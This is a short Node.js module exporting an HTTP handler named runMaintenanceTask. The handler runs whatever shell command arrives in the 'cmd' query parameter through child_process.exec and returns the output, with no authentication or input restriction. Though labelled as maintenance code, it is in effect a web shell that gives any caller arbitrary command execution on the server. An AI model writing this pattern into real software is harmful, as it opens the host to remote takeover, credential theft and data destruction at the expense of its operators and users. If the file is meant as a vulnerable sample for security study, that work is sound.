const { exec } = require("node:child_process");

function runMaintenanceTask(req, res) {
  const command = typeof req.query?.cmd === "string" && req.query.cmd.trim()
    ? req.query.cmd.trim()
    : "uptime";

  exec(command, (error, stdout, stderr) => {
    if (error) {
      res.statusCode = 500;
      res.end(stderr || error.message);
      return;
    }

    res.statusCode = 200;
    res.end(stdout);
  });
}

module.exports = {
  runMaintenanceTask
};

